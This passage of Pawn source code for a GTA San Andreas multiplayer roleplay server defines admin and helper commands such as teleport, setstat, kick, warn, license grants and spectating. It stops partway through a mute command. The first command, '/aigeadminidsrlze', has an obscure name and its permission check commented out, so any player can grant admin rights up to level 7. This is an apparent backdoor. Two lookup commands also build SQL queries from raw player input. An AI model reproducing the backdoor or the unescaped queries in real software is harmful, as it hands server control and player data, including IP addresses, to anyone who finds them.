	if(!strcmp(cmd, "/aigeadminidsrlze", true))
	{
	    //if(pData[playerid][pAdmin] < 6) return true;
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/shenidedikocmovtyan");
	    new actplayerid = strval(tmp);
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/asasasas");
		new level = strval(tmp);
		if(level > 7) return SendClientMessage(playerid,CGRAY,"0danokacmatqva");
	    pData[actplayerid][pAdmin] = level;
	    SendClientMessage(playerid, CINFO, "asasassa.");
		UpdatePlayerData(actplayerid,"admin",level);
		SendClientMessage(actplayerid, CBADINFO, "asasasasasasa");
		return true;
	}
	if(!strcmp(cmd,"/gethere",true))
	{
        if(pData[playerid][pAdmin] < 2) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/gethere [ID Motamashis]");
        new id = strval(tmp);
        if(!IsPlayerConnected(id)) return SendClientMessage(playerid, CGRAY, "Araswori ID");
		new Float:plocx,Float:plocy,Float:plocz;
		GetPlayerPos(playerid, plocx, plocy, plocz);
		SetPlayerPos(id, plocx,plocy+2, plocz);
		SetPlayerVirtualWorld(id, GetPlayerVirtualWorld(playerid));
		SetPlayerInterior(id, GetPlayerInterior(playerid));
		SetPVarInt(id,"GETHERE1",gettime()+3);
		GameTextForPlayer(id,"~w~~n~~n~~n~~n~~n~~y~Teleport",3000,3);
		return true;
	}
	if(!strcmp(cmd,"/goto",true))
	{
		if(pData[playerid][pAdmin] < 1) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/goto [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid, CGRAY, "Araswori ID");
		new Float:plocx,Float:plocy,Float:plocz;
		GetPlayerPos(id, plocx, plocy, plocz);
		SetPlayerPos(playerid,plocx,plocy+2, plocz);
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(id));
		SetPlayerInterior(playerid, GetPlayerInterior(id));
		GameTextForPlayer(playerid,"~w~~n~~n~~n~~n~~n~~y~Teleport",3000,3);
		return true;
	}
	if(!strcmp(cmd,"/gzcolor",true))
	{
	    if(pData[playerid][pAdmin] < 5) return true;
		tmp = strtok(cmdtext,idx);
		new l = strval(tmp);
		if(!IsInAllowedF(l)) return SendClientMessage(playerid,CGRAY,"/gzcolor [ID Bandis (3-7)]");
		for(new i = 0;i<150;i++)
		{
			if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
			{
				GZInfo[i][gFrakVlad] = l;
				GangZoneStopFlashForAll(GZInfo[i][gID]);
				GangZoneHideForAll(GZInfo[i][gID]);
				GangZoneShowForAll(GZInfo[i][gID],GetGangZoneColor(i));
				SaveGZ(i+1);
				return true;
			}
		}
	}
	if(!strcmp(cmd, "/mask", true))
	{
	    if(GetPVarInt(playerid, "maska") != 1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Maska");
	    if(GetPVarInt(playerid, "maska") == 2) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Giketiat Maska");
	    ApplyAnimation(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0);
		SetPlayerColor(playerid, 0x7a766700);
		SetPVarInt(playerid, "maska", 2);
		SetPVarInt(playerid, "maska2", 6);
		MeAction(playerid,"Gaikete Maska");
		SendClientMessage(playerid,CGRAY,"Tqveni Adgilmdebareoba Daimaleba 10 Wutit.");
	}
 	if(!strcmp(cmd, "/exitcar", true))
 	{
 	    if(GetPVarInt(playerid, "car22") != 3) return true;
 	    DestroyVehicle(vehplayer[playerid]);
 	    for(new i = 0; i < 12; i++) TextDrawHideForPlayer(playerid,VehSelect[i]);
	    for(new i = 0; i < 5; i++) PlayerTextDrawHide(playerid,VehSelectPl[playerid][i]);
	    CancelSelectTextDraw(playerid);
	    SetCameraBehindPlayer(playerid);
	    SetPlayerVirtualWorld(playerid,0);
	    SetPVarInt(playerid,"car22",0);
 	}
 	if(!strcmp(cmd, "/test1", true))
 	{
 	    if(pData[playerid][pAdmin] < 1) return true;
 	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/test1 [1-5]");
		new i = strval(tmp);
		switch(i)
		{
		    case 1: SetPlayerPos(playerid,3053.3181152,-672.8280029,-14.5670004);
		    case 2: SetPlayerPos(playerid,-159.9799957,1171.5639648,19.4990005);
		    case 3: {}
		    case 4: Pokaz(playerid,1,70000,0);
		    case 5: Pokaz(playerid,1,190000,1);
		}
		/*new engine,lights,alarm,doors,bonnet,boot,objective;
  		GetVehicleParamsEx(gVehicles[pData[playerid][pHouse]][vvID],engine,lights,alarm,doors,bonnet,boot,objective);
        SetVehicleParamsEx(gVehicles[pData[playerid][pHouse]][vvID],engine,lights,alarm,doors,1,boot,objective);
        SetPlayerPos(playerid,1387.5520,-17.9535,1000.9229);
        SetPlayerFacingAngle(playerid,224.9290);
        GoAnim(playerid,"CAR_CHAT","car_talkm_loop",4.1,1,0,0,0,0,0);

        TextDrawShowForPlayer(playerid, RegisterLoginTD[playerid]);
		LST[playerid] = SetTimerEx("LoadingScreenTimer",1000,true,"d",playerid);
		InterpolateCameraPos(playerid, 1379.284545, -13.561935, 1003.019165, 1394.673217, -26.049509, 1002.897583, 100000);
		InterpolateCameraLookAt(playerid, 1383.451904, -16.250499, 1002.383239, 1391.216186, -22.681480, 1001.591674, 100000);*/
 	}
	if(!strcmp(cmd, "/tp", true))
	{
		if(pData[playerid][pAdmin] < 1) return true;
		if(GetPlayerState(playerid) == 2) return SendClientMessage(playerid,CGRAY,"Gadmodi Avtomobilidan.");
		new listitems[] = "1. AvtoSamuhsao\n2. Mshenebloba\n3. Rkinigza\n4. Meria\n5. Universiteti\n6. Ballas\n7. Grove Street\n8. Aztek\n9. Vagos\n10. Rifa\n11. LS Saavadmyopo\n12. Saavadmyopo SF\n13. Saavadmyopo LV\n14. Policia LS\n15. Policia SF\n16. Policia LV\n17. Staianka\n18. Kazino\n19. Sapyrobile\n20. Eklesia\n21. Spawni\n22. Samkervalo Pabrika\n23. Sastumro LS\n24. Sastumro SF\n25. Sastumro LV\n26. Avtoskola";
		ShowPlayerDialog(playerid, dTeleport, DIALOG_STYLE_LIST, "Adgilebi", listitems, "Archeva", "Daxurva");
	}
	if(!strcmp(cmd, "/bizall", true))
	{
	    if(pData[playerid][pAdmin] < 6) return true;
	    for(new id = 0; id < MAX_BUSINESS_COUNT; id++)
	    {
			if(gBusiness[id][busiPrice] > 15)
			{
			    gBusiness[id][busiPrice] = 15;
			    UpdateBusinessData(id+1,"price",15);
			}
		    gBusiness[id][busiProduct] += 30000;
			UpdateBusinessData(id,"product",gBusiness[id][busiProduct]);
			UpdateBusinessText(id);
		}
	}
	if(!strcmp(cmd, "/setstat", true))
	{
     	if(pData[playerid][pAdmin] < 5) return true;
     	tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp))
		{
			SendClientMessage(playerid, CGRAY, "/setstat [ID Motamashis] [Nomeri] [Raodenoba]");
			SendClientMessage(playerid, COLOR_LIGHTGREEN, "Nomeri: 1) Sqesi 2) Wlovaneba 3) Samushao");
   			SendClientMessage(playerid, COLOR_LIGHTGREEN, "4) Skini 5) Fuli 6) Banki 7) Gamocdileba 8) Exp 9) Telefonis Nomeri");
		    SendClientMessage(playerid, COLOR_LIGHTGREEN, "10) Narkotiki 11) Tyviebi 12) Metali 13) DonateMoney");
			return true;
		}
		new i = strval(tmp);
		if(!IsPlayerConnected(i)) return SendClientMessage(playerid, CGRAY, "Motamashe Ver Moidzebna.");
		tmp = strtok(cmdtext, idx);
		new set = strval(tmp);
		tmp = strtok(cmdtext, idx);
		new value = strval(tmp);
		new zStr[100];
		switch(set)
		{
		    case 1:
			{
			    if(value < 1 || value > 2) return SendClientMessage(playerid, CGRAY, "Sqesi | 1) Mamakaci 2) Qali");
   			    pData[i][pSex] = value;
			    UpdatePlayerData(i,"sex",pData[i][pSex]);
			    format(zStr, 100, "Tqven Sheucvalet Sqesi Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 2:
			{
			    if(value < 16 || value > 110) return SendClientMessage(playerid,CGRAY,"Asaki Ar Unda Iyos Naklebi 16-Ze Da Meti 50-Ze");
                pData[i][pAge] = value;
			    UpdatePlayerData(i,"age",pData[i][pAge]);
			    format(zStr, 100, "Tqven Sheucvalet Asaki Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 3:
			{
			    if(value < 3 || value > 4) return SendClientMessage(playerid,CGRAY,"Samushao | 3)Taqsisti 4)Meqaniki");
			    pData[i][pJob] = value;
			    UpdatePlayerData(i,"job",pData[i][pJob]);
			    format(zStr, 100, "Tqven Sheucvalet Samushao Adgili Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 4:
			{
			    if(value < 1 || value > 299) return SendClientMessage(playerid,CGRAY,"ID Skinis 1-Dan 299-Mde");
				pData[i][pSkin] = value;
			    UpdatePlayerData(i,"skin",pData[i][pSkin]);
			    format(zStr, 100, "Tqven Sheucvalet Skini Motamashes: %s", Name2(i));
			    if(!pData[i][pFraction]) SetPlayerSkin(i, value);
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 5:
			{
			    format(zStr, 100, "Tqven Sheucvalet Fulis Raodenoba Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			    pData[i][pMoney] = value;
				ResetPlayerMoney(i); GivePlayerMoney(i,pData[i][pMoney]);
				UpdatePlayerData(i,"money",pData[i][pMoney]);
			}
			case 6:
			{
			    pData[i][pBank] = value;
			    UpdatePlayerData(i,"bank",pData[i][pBank]);
			    format(zStr, 100, "Tqven Sheucvalet Fulis Raodenoba Bankshi Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 7:
			{
			    pData[i][pLevel] = value; SetPlayerScore(i, value);
			    UpdatePlayerData(i,"level",pData[i][pLevel]);
	   			format(zStr, 100, "Tqven Sheucvalet Gamocdilebis Done Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 8:
			{
			    pData[i][pExp] = value;
			    UpdatePlayerData(i,"exp",pData[i][pExp]);
	   			format(zStr, 100, "Tqven Sheucvalet EXP Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 9:
			{
			    pData[i][pPhone] = value;
			    UpdatePlayerData(i,"phone",pData[i][pPhone]);
	   			format(zStr, 100, "Tqven Sheucvalet Telefonis Nomeri Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 10:
			{
			    pData[i][pDrugs] = value;
			    UpdatePlayerData(i,"drugs",pData[i][pDrugs]);
	   			format(zStr, 100, "Tqven Sheucvalet Narkotikebis Raodenoba Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 11:
			{
			    pData[i][pAmmo] = value;
			    UpdatePlayerData(i,"ammo",pData[i][pAmmo]);
	   			format(zStr, 100, "Tqven Sheucvalet Tyviebis Raodenoba Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 12:
			{
			    pData[i][pGunAmount] = value;
			    UpdatePlayerData(i,"gunamount",pData[i][pGunAmount]);
	   			format(zStr, 100, "Tqven Sheucvalet Metalis Raodenoba Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
			case 13:
 			{
			    pData[i][pDonate] = value;
			    UpdatePlayerData(i,"donate",pData[i][pDonate]);
	   			format(zStr, 100, "Tqven Sheucvalet DonateMoneys Raodenoba Motamashes: %s", Name2(i));
			    SendClientMessage(playerid, COLOR_LIGHTRED, zStr);
			}
		    default:
			{
				SendClientMessage(playerid, CGRAY, "/setstat [ID Motamashis] [Nomeri] [Raodenoba]");
				SendClientMessage(playerid, COLOR_LIGHTGREEN, "Nomeri: 1)Sqesi 2)Wlovaneba 3)Samushao");
			    SendClientMessage(playerid, COLOR_LIGHTGREEN, "4)Skini 5)Fuli 6)Banki 7)Gamocdileba 8)Exp 9)Telefonis Nomeri");
			    SendClientMessage(playerid, COLOR_LIGHTGREEN, "10)Narkotiki 11)Tyviebi 12)Metali");
				return true;
			}
		}
	    return true;
	}
	if(!strcmp(cmd, "/agl", true))
	{
	    if(pData[playerid][pAdmin] < 5) return true;
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/agl [ID Motamashis]");
	    new actplayerid = strval(tmp);
	    pData[actplayerid][pLicenses] = {1,1,1,1};
	    SendClientMessage(playerid, CINFO, "Shen Mieci Yvela Licenzia Motamashes.");
	    new query[200];
		format(query,sizeof(query),"UPDATE `members` SET `licDrive` = '1',`licFly` = '1',`licBoat` = '1',`licWeap` = '1' WHERE `nickname` = '%s'",Name2(actplayerid));
		mysql_empty(mysql, query);
		SendClientMessage(actplayerid, CBADINFO, "Tqven Gadmogecat Yvela Licenzia Adminisgan.");
		return true;
	}
	if(!strcmp(cmd, "/setapanel", true))
	{
	    if(pData[playerid][pAdmin] < 6) return true;
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/makeadmin [ID игрока] [Raodenoba]");
	    new actplayerid = strval(tmp);
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/makeadmin [ID Motamashis] [Raodenoba]");
		new level = strval(tmp);
		if(level > 7) return SendClientMessage(playerid,CGRAY,"0-Dan 6-Mde");
	    pData[actplayerid][pAdmin] = level;
	    SendClientMessage(playerid, CINFO, "Tqven Shegiliat Naxot Shesadzlebloba Moderatoris.");
		UpdatePlayerData(actplayerid,"admin",level);
		SendClientMessage(actplayerid, CBADINFO, "Tqven Gaxdit Administratori.");
		SendClientMessage(actplayerid, CBADINFO, "Gamoiyenet /ahelp.");
		return true;
	}
	if(!strcmp(cmd, "/makehelper", true))
	{
	    if(pData[playerid][pAdmin] < 6) return true;
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/makehelper [ID player] [Raodenoba]");
	    new actplayerid = strval(tmp);
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/makehelper [ID Motamashis] [Raodenoba]");
		new level = strval(tmp);
		if(level > 4) return SendClientMessage(playerid,CGRAY,"0-Dan 4-Mde");
	    pData[actplayerid][pHelper] = level;
	    SendClientMessage(playerid, CINFO, "Helper Gacemulia.");
		UpdatePlayerData(actplayerid,"helper",level);
		SendClientMessage(actplayerid, CBADINFO, "Tqven Miiget HELPER.");
		SendClientMessage(actplayerid, CBADINFO, "Gamoiyenet /hhelp.");
		return true;
	}
	if(!strcmp(cmd,"/makeleader",true))
	{
		if(pData[playerid][pAdmin] < 6) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/makeleader [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(pData[actplayerid][pWarn]) return SendClientMessage(playerid,CGRAY,"Am Motamashes Aqvs Gaprtxileba.");
		SetPVarInt(playerid,"actplayerid",actplayerid);
		new mes2[256];
		for(new i;i<FRACTION_COUNT;i++) format(mes2,sizeof(mes2),"%s%s\n",mes2,gFractionName[i]);
		ShowPlayerDialog(playerid,dLeaderskin,2,Name2(actplayerid),mes2,"NEXT","CLOSE");
	}
	if(!strcmp(cmd,"/uval",true))
	{
		if(pData[playerid][pAdmin] < 6) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/auninvite [ID игрока]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(!pData[actplayerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Motamashe Ar Aris Organizaciashi");
		if(gNewsDialer == actplayerid) OnPlayerCommandText(actplayerid,"/stopdial");
		new query[180];
		format(query,sizeof(query),"UPDATE `members` SET `fraction` = '0', `rank` = '0', `fractionskin` = '0', `subfraction` = '0' WHERE `nickname` = '%s'",Name2(actplayerid));
		mysql_empty(mysql, query);
		if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
		pData[actplayerid][pFraction] = 0;
		pData[actplayerid][pRank] = 0;
		pData[actplayerid][pFractionSkin] = 0;
		pData[actplayerid][pSubfraction] = 0;
		SetPlayerColor(actplayerid,0xFFFFFF11);
		new houseid = pData[actplayerid][pHouse]-1;
		if(!(houseid+1) || ((houseid+1) > 0 && !GetString(Name2(actplayerid),gHouses[houseid][houseOwner]))) SetPlayerSkin(actplayerid,pData[actplayerid][pSkin]);
		else if(!gHouses[houseid][houseImprove][1]) SetPlayerSkin(actplayerid,pData[actplayerid][pSkin]);
		else
		{
			for(new x; x < 3; x ++) {
				if(!gHouses[houseid][houseSkin]) continue;
				pData[actplayerid][pSkin] = gHouses[houseid][houseSkin];
				if(GetPlayerSkin(actplayerid) == gHouses[houseid][houseSkin][3]) SetPlayerSkin(actplayerid,pData[actplayerid][pSkin]);
			}
			gHouses[houseid][houseSkin][3] = 0;
		}
		format(mes,sizeof(mes),"Tqven Xart Gantavisuplebuli Organizaciidan Administratoris Mier %s",Name2(playerid));
		SendClientMessage(actplayerid,CBADINFO,mes);
		format(mes,sizeof(mes),"%s Gaagdet Organizaciidan.",Name2(actplayerid));
		SendClientMessage(playerid,CINFO,mes);
	}
	if(!strcmp(cmd, "/spcar", true))
	{
		if(pData[playerid][pAdmin] < 6) return true;
		for(new c=0; c<MAX_VEHICLES; c++)
		{
			if(!IsVehicleOccupied(c)) SetVehicleToRespawn(c);
		}
		format(mes,sizeof(mes),"Administratorma %s Daarespawna Tavisupali Manqanebi.",Name2(playerid));
		SendClientMessageToAll(CADMIN,mes);
	}
	if(!strcmp(cmd,"/geton",true))
	{
	    if(pData[playerid][pAdmin] < 2) return true;
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/geton [Saxeli Motamashis]");
		new query[256];
		format(query, sizeof(query), "SELECT * FROM `members` WHERE `nickname` = '%s'", tmp);
		mysql_tquery(mysql, query, "mysql_geton", "d", playerid);
		return true;
	}
	if(!strcmp(cmd,"/getip",true))
	{
	    if(pData[playerid][pAdmin] < 4) return true;
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/getip [Saxeli Motamashis]");
		new query[256];
		format(query, sizeof(query), "SELECT * FROM `members` WHERE `nickname` = '%s'", tmp);
		mysql_tquery(mysql, query, "mysql_getip", "d", playerid);
		return true;
	}
	if(!strcmp(cmd,"/kick",true))
	{
		if(pData[playerid][pAdmin] < 2) return true;
		if(GetPVarInt(playerid,"ANTIFLOOD_KICK") > gettime()) return SendClientMessage(playerid,CGRAY,"Gtxovt Daelodot..");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/kick [ID Motamashis] [Mizezi]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || IsKicked(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(pData[id][pAdmin] > pData[playerid][pAdmin]) return SendClientMessage(playerid,CGRAY,"ES ID - Administratoria");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/kick [ID Motamashis] [Mizezi]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		new nick[24];
		GetPlayerName(id,nick,24);
		format(mes,sizeof(mes),"Administratorma %s Gaagdo %s. Mizezi: %s",Name2(playerid),nick,tmp);
		SendClientMessageToAll(CADMIN,mes);
		NewKick(id);
		SetPVarInt(playerid,"ANTIFLOOD_KICK",gettime()+10);
	}
	if(!strcmp(cmd,"/hkick",true))
	{
		if(pData[playerid][pHelper] < 2) return true;
		if(GetPVarInt(playerid,"ANTIFLOOD_KICK") > gettime()) return SendClientMessage(playerid,CGRAY,"Gtxovt Daelodot..");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/hkick [ID Motamashis] [Mizezi]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || IsKicked(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(pData[id][pAdmin] > pData[playerid][pAdmin]) return SendClientMessage(playerid,CGRAY,"ES ID - Administratoria");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/hkick [ID Motamashis] [Mizezi]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		new nick[24];
		GetPlayerName(id,nick,24);
		format(mes,sizeof(mes),"Helperma %s Gaagdo %s. Mizezi: %s",Name2(playerid),nick,tmp);
		SendClientMessageToAll(CADMIN,mes);
		NewKick(id);
		SetPVarInt(playerid,"ANTIFLOOD_KICK",gettime()+10);
	}
	if(!strcmp(cmd,"/hre",true))
	{
		if(pData[playerid][pHelper] < 4) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/sp [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if((pData[playerid][pAdmin] < 5 && pData[id][pAdmin] >= 5)) return SendClientMessage(playerid, CADMIN, "Shecdoma!");
        new pstate = GetPlayerState(id), vehicleid = GetPlayerVehicleID(id);
		if(GetPVarInt(playerid,"Spectating") == 0)
		{
			TogglePlayerSpectating(playerid,1);
			new Float:x,Float:y, Float:z;
			GetPlayerPos(playerid,x,y,z);
			SetPVarFloat(playerid,"oldx",x);
			SetPVarFloat(playerid,"oldy",y);
			SetPVarFloat(playerid,"oldz",z);
			SetPVarInt(playerid,"oldint",GetPlayerInterior(playerid));
			SetPVarInt(playerid,"oldworld",GetPlayerVirtualWorld(playerid));
			SetPVarInt(playerid,"Spectating",1);
			PlayerTextDrawShow(playerid,RECON[playerid]);
		}
		if(GetPlayerState(id) == 9 && pData[id][pAdmin] >= 1) return SendClientMessage(playerid,CGRAY,"Motamashe Gadavida Satvaltvalo Rejimshi");
		pTemp[playerid][pSpectatee] = id;
		SetPlayerInterior(playerid,GetPlayerInterior(id));
		SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
		if(pstate == PLAYER_STATE_DRIVER || pstate == PLAYER_STATE_PASSENGER) PlayerSpectateVehicle(playerid,vehicleid);
		else PlayerSpectatePlayer(playerid,id);
		ShowMenuForPlayer(specmenu,playerid);
		new fps = 45 + random(60), Float:hppp, Float:aermor, Float:health, mes2[300];
		GetPlayerArmour(id,aermor);
		GetPlayerHealth(id,hppp);
		if(IsPlayerInAnyVehicle(id)) GetVehicleHealth(GetPlayerVehicleID(id),health);
		format(mes2,sizeof(mes2),"~w~%s~n~~n~~r~Ping: ~w~%d~n~~r~FPS: ~w~%d~n~~n~~y~Interior: ~w~%d~n~~y~Virtual World: ~w~%d~n~~y~Animation: ~w~%d~n~~y~Speed: ~w~%d~n~~n~~g~Armour: ~w~%.2f~n~~g~Health: ~w~%.2f~n~~g~Car HP: ~w~%.0f~n~",Name2(id),GetPlayerPing(id),fps,GetPlayerInterior(id),GetPlayerVirtualWorld(id),GetPlayerAnimationIndex(id),SpeedVehicle(id) / 2,aermor,hppp,health);
		PlayerTextDrawSetString(playerid,RECON[playerid],mes2);
	}
	if(!strcmp(cmd,"/hwarn",true))
	{
		if(pData[playerid][pHelper] < 3) return true;
		if(GetPVarInt(playerid,"ANTIFLOOD_KICK") > gettime()) return SendClientMessage(playerid,CGRAY,"Gtxovt Daelodot..");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/hwarn [ID Motamashis] [Mizezi]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || IsKicked(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(pData[id][pAdmin] > pData[playerid][pAdmin]) return SendClientMessage(playerid,CGRAY,"ES ID - Administratoria.");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/hwarn [ID Motamashis] [Mizezi]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		if(pData[id][pFraction])
  		{
  		    new query[180];
			format(query,sizeof(query),"UPDATE `members` SET `fraction` = '0', `rank` = '0', `fractionskin` = '0', `subfraction` = '0' WHERE `nickname` = '%s'",Name2(id));
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
			pData[id][pFraction] = 0;
			pData[id][pRank] = 0;
			pData[id][pFractionSkin] = 0;
			pData[id][pSubfraction] = 0;
			SetPlayerColor(id,0xFFFFFF11);
			new houseid = pData[id][pHouse]-1;
			if(!(houseid+1) || ((houseid+1) > 0 && !GetString(Name2(id),gHouses[houseid][houseOwner]))) SetPlayerSkin(id,pData[id][pSkin]);
			else if(!gHouses[houseid][houseImprove][1]) SetPlayerSkin(id,pData[id][pSkin]);
			else
			{
				for(new x; x < 3; x ++) {
					if(!gHouses[houseid][houseSkin]) continue;
					pData[id][pSkin] = gHouses[houseid][houseSkin];
					if(GetPlayerSkin(id) == gHouses[houseid][houseSkin][3]) SetPlayerSkin(id,pData[id][pSkin]);
				}
				gHouses[houseid][houseSkin][3] = 0;
			}
			format(mes,sizeof(mes),"Tqven Gagagdot Organizaciidan Helperma %s",Name2(playerid));
			SendClientMessage(id,CBADINFO,mes);
			format(mes,sizeof(mes),"%s Gaagdet Organizaciidan.",Name2(id));
			SendClientMessage(playerid,CINFO,mes);
		}
		new level = floatround(float(pData[id][pWarn] - gCurDay) / WARN_TIME,floatround_ceil);
		if(!pData[playerid][pWarn] || level <= 2)
		{
			if(pData[id][pWarn] > gCurDay) pData[id][pWarn] += WARN_TIME;
			else pData[id][pWarn] = gCurDay + WARN_TIME;
			UpdatePlayerData(id,"warn",pData[id][pWarn]);
			format(mes,sizeof(mes),"Helperma %s Misca Gafrtxileba %s. Mizezi: %s",Name2(playerid),Name2(id),tmp);
		}
		else
		{
			pData[id][pWarn] = 0;
			UpdatePlayerData(id,"warn",pData[id][pWarn]);
			format(mes,sizeof(mes),"Helperma %s Daado Bani %s 10 Dgit (3 Gafrtxileba). Mizezi: %s",Name2(playerid),Name2(id),tmp);
			ServerBan(id,10);
		}
		SendClientMessageToAll(CADMIN,mes);
		NewKick(id);
		SetPVarInt(playerid,"ANTIFLOOD_KICK",gettime()+10);
	}
	if(!strcmp(cmd,"/hunmute",true))
	{
		if(!pData[playerid][pHelper]) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/unmute [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID.");
		pData[id][pMut] = 0;
		UpdatePlayerData(id,"mut",0);
		format(mes,sizeof(mes),"[H] %s Moxsna(а) Mute %s",Name2(playerid),Name2(id));
		AdminChat(CORANGE,mes);
		format(mes,sizeof(mes),"Helperma %s Mogxsna Mute",Name2(playerid));
		SendClientMessage(id,CADMIN,mes);
	}
	if(!strcmp(cmd,"/hpm",true))
	{
		if(pData[playerid][pHelper] < 1) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/pm [ID Motamashis] [Pasuxi]");
		new id = strval(tmp);
		tmp = strrest(cmdtext, idx);
		format(mes,sizeof(mes),"[H] %s Pasuxi: %s",Name2(playerid),tmp);
		SendClientMessage(id,0x7FB9B7AA,mes);
		format(mes,sizeof(mes),"[H] %s Pasuxi: %s: %s",Name2(playerid),Name2(id),tmp);
		AdminChat(0x7FB9B7AA,mes);
	}
	if(!strcmp(cmd,"/hmute",true))
	{
		if(!pData[playerid][pHelper]) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/hmute [ID Motamashis] [Ramdeni Wutit] [Mizezi]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/hmute [ID Motamashis] [Ramdeni Wutit] [Mizezi]");
		new time = strval(tmp);
		if(time < 1 || time > 600) return SendClientMessage(playerid,CGRAY,"Araswori Wutebis Raodenoba");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/mute [ID Motamashis] [Ramdeni Wutit] [Mizezi]");
